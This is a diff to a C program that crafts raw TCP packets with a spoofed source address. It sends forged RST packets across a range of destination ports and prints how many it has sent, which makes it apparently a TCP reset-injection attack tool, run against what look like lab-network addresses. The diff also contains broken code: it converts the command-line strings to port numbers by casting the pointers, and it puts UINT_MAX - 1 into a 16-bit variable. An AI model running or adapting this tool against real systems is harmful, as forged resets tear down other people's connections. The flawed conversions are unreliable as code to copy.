@@ -1,3 +1,4 @@
+#include <limits.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <errno.h>
@@ -58,25 +59,24 @@ int main(int argc, char *argv[])
 {
     int sockfd, total, n, yes = 1;
     char datagram[DATAGRAMSIZE], pseudo_packet[PSEUDOPACKETSIZE], ipstr[INET_ADDRSTRLEN];
+    struct sockaddr_in sa;
     struct iphdr *iph;
     struct tcphdr *tcph, *cstcph;
     struct pshdr *psh;
-    char *sIP = "10.0.2.2";
-    char *dIP = "10.0.2.15";
+    char *sIP = "10.0.2.2", *dIP = "10.0.2.15";
     uint16_t sport = 35801, dport, port0 = 30000, port_max = UINT_MAX - 1, win = 8192;
     uint16_t id0 = rand() %(65536);
     uint32_t seq, seq0 = 0, ack0 = 0;
     size_t tcp_len;
     void *data;
-    struct sockaddr_in sa;
 
     if (argc != 3) {
 	    fprintf(stderr,"usage: reset port0 port_max\n");
 	    exit(1);
 	}
 
-    port0 = argv[1];
-    port_max = argv[2];
+    port0 = (uint16_t) argv[1];
+    port_max = (uint16_t) argv[2];
 
     // Open raw socket without protocol header
     if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
@@ -167,6 +167,9 @@ int main(int argc, char *argv[])
             if ((n = sendto(sockfd, datagram, sizeof(struct iphdr) + tcp_len, 0, (struct sockaddr *) &sa, sizeof sa)) < 0)
             {
                 perror("fakesync: sendto()\n");
+            }
+            if ((total++) % 8192 == 0) {
+                printf("%u RST packets sent\n", total);
             }
         }
     }
